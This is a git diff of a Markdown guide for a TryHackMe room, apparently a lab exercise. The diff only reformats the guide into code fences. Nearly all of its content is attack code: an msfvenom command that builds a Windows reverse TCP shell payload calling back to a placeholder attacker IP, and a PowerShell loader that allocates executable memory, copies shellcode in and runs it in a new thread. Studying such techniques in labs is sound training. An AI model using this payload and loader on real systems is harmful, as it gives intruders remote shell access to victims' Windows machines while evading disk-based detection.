@@ -1,9 +1,12 @@
-# TryHackMe
-Guides for rooms in TryHackMe
 
+
+
+```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=4444 -f powershell
+```
 
 
+```powershell
 $VrtAlloc = @"
 using System;
 using System.Runtime.InteropServices;
@@ -39,15 +42,16 @@ public class CrtThread{
 }
 "@
 Add-Type $CrtThread   
+```
 
-
-
+```powershell
 [Byte[]] $buf = SHELLCODE_PLACEHOLDER
+```
 
 
+```powershell
 [IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
 $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
 [WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
-
-
+```
